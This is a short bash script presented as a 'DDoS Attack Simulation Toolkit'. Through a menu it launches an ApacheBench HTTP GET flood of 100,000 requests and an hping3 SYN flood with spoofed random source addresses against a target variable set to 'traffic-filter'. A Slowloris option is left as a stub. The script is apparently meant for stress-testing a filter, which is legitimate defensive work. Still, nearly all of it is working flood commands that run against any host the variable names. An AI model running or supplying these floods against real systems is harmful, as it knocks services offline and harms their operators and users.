#!/bin/bash
# DDoS Attack Simulation Toolkit
TARGET="traffic-filter"

echo "Select Attack Type:"
echo "1) Volumetric: HTTP GET Flood (ab)"
echo "2) Protocol: TCP SYN Flood (hping3)"
echo "3) Application-Layer: Slowloris (python)"
read -p "Choice: " choice

case $choice in
  1)
    echo "[*] Launching HTTP Flood against $TARGET..."
    ab -n 100000 -c 1000 http://$TARGET/api/data
    ;;
  2)
    echo "[*] Launching SYN Flood against $TARGET..."
    hping3 -S -p 80 --flood --rand-source $TARGET
    ;;
  3)
    echo "[*] Launching Slowloris (Conceptual)..."
    echo "Requires slowloris.py to be implemented."
    ;;
  *)
    echo "Invalid choice."
    ;;
esac
